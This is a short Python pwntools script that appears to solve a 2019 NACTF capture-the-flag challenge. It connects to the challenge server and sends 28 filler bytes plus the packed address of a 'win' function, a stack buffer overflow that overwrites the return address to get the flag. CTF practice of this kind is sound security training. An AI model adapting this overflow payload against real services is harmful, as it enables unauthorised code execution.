#!/usr/bin/python
from pwn import *

p = remote("shell.2019.nactf.com", 31462)

win_addr = 0x80491b2


payload = "A"*28
payload += p32(win_addr)

print("[*] sending payload..")
p.sendline(payload)
print("[*] done.")

flag = p.recvall()
print("[*] output: " + flag)
p.clean()
p.close()
